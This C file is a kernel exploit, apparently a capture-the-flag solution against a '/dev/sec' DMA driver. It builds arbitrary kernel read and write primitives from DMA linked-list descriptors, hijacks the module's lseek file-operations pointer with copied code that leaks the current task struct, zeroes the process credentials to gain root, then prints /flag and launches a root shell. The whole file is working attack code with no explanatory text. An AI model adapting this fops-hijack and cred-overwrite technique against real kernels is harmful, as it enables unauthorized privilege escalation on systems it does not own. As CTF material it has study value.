#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>
#include <fcntl.h>
#include <assert.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/mman.h>

#define THREAD_NAME "pr0cf51!!"
#define THREAD_NAME_LEN 8


#define OFFSET_DATA1 0x1000
#define OFFSET_DATA2 0x2000

#define SEC_DMA_BASE 0x00f000000
#define SEC_DMA_MAX  0x00800000
#define PL666_CONF_EN 0x0001

#define PL666_LLI_MORE 0x0001
#define PL666_LLI_READ 0x0002

#define PL666_RD_IT_MASK 0
#define PL666_RD_IT_VAL 4
#define PL666_RD_CONF 8
#define PL666_RD_TEST 12

#define PL666_WR_IT 0
#define PL666_WR_IT_CLR 4
#define PL666_WR_CONF 8
#define PL666_WR_ADDR_LOW 12
#define PL666_WR_ADDR_HIGH 16

#define DMA_READ 0
#define DMA_WRITE 1
#define sign_extend(x, signbit) ((x) | (0 - ((x) & (1 << (signbit)))))
#define branch_displacement(insn) sign_extend(((insn) & 0xffffff) << 2, 25)

char zeropage[0x1000];

struct lli{
    uint64_t src;
    uint64_t dst;
    uint32_t size;
    uint32_t ctrl;
};

int Open(const char *filename, int mode) {
    int fd;
    if ((fd = open(filename, mode)) < 0) {
        perror("open");
        exit(-1);
    }
    return fd;
}

void virt_write(uint64_t where, void *data, size_t data_len) {
    assert(data_len <= 0x1000);
    int device_fd = Open("/dev/sec", O_RDWR);
    void *pages = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    struct lli *items = (struct lli *)pages;
    struct lli *buf = (struct lli *)((uint64_t)pages + 0x1000);
 
    // save what to copy
    memcpy((void *)buf, data, data_len);
    items[0].dst = OFFSET_DATA2;
    items[0].src = (uint64_t)buf;
    items[0].size = data_len;
    write(device_fd, items, sizeof(items[0]));

    // save payload
    buf[1].src = OFFSET_DATA2;
    buf[1].dst = where;
    buf[1].size = data_len;
    buf[1].ctrl = PL666_LLI_READ;
    items[0].dst = OFFSET_DATA1;
    items[0].src = (uint64_t)buf;
    items[0].size = sizeof(items[0]) * 2;
    write(device_fd, items, sizeof(items[0]));

    // trigger payload
    items[0].src = OFFSET_DATA1;
    items[0].dst = (uint64_t)items;
    items[0].size = sizeof(items[0]) * 2;
    // dummy entry to be overwritten
    items[1].src = 0x0;
    items[1].dst = (uint64_t)items;
    items[1].size = 0x10;
    read(device_fd, items, sizeof(items[0]) * 2);
    close(device_fd);
}

void virt_read(uint64_t where, void *data, size_t data_len) {
    assert(data_len <= 0x1000);
    int device_fd = Open("/dev/sec", O_RDWR);
    void *pages = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    struct lli *items = (struct lli *)pages;
    struct lli *buf = (struct lli *)((uint64_t)pages + 0x1000);

    // save payload
    buf[1].dst = OFFSET_DATA2;
    buf[1].src = where;
    buf[1].size = data_len;
    buf[1].ctrl = 0;
    items[0].dst = OFFSET_DATA1;
    items[0].src = (uint64_t)buf;
    items[0].size = sizeof(items[0]) * 2;
    write(device_fd, items, sizeof(items[0]));

    // trigger payload
    items[0].src = OFFSET_DATA1;
    items[0].dst = (uint64_t)items;
    items[0].size = sizeof(items[0]) * 2;
    // dummy entry to be overwritten
    items[1].src = 0x0;
    items[1].dst = (uint64_t)items;
    items[1].size = 0x10;
    read(device_fd, items, sizeof(items[0]) * 2);

    // read data
    items[0].src = OFFSET_DATA2;
    items[0].dst = (uint64_t)buf;
    items[0].size = data_len;
    read(device_fd, items, sizeof(items[0]));
    memcpy(data, (void *)buf, data_len);
    close(device_fd);
}

uint64_t return_task() {
    uint64_t task_struct;
    void (*fptr)();
	asm volatile ("mrs %0, sp_el0" : "=r" (task_struct));
    return task_struct;
}

int main(int argc, char **argv) {
    
    uint64_t vmmod, module_base, pdata;
    uint64_t buf[0x200];
    sscanf(argv[1], "%lx", &vmmod);
    printf("vmmod: %p\n", (void *)vmmod);

    module_base = vmmod - 9488;
    printf("module_base: %p\n", (void *)module_base);
    
    int device_fd = Open("/dev/sec", O_RDONLY);
    // overwrite lseek handler to leak task structure
    uint64_t fops = module_base + 0x2070 - 14*8;
    uint64_t func_addr = module_base + 0x9C;
    virt_write(fops + 8, &func_addr, sizeof(func_addr));
    virt_write(func_addr, return_task, 0x30);
    uint64_t current_task = lseek(device_fd, 0, 0);
    virt_read(current_task, buf, sizeof(buf));
    uint64_t cred = buf[0x5e8/8];
    virt_read(cred, buf, sizeof(buf));
    memset(buf, 0, 0x28);
    virt_write(cred, buf, 0x28);
    char flagbuf[0x100];
    int flagfd = open("/flag", O_RDONLY);
    size_t flagsize = read(flagfd, flagbuf, sizeof(flagbuf));
    write(1, flagbuf, flagsize);
    system("/bin/sh");
   
    return 0;
}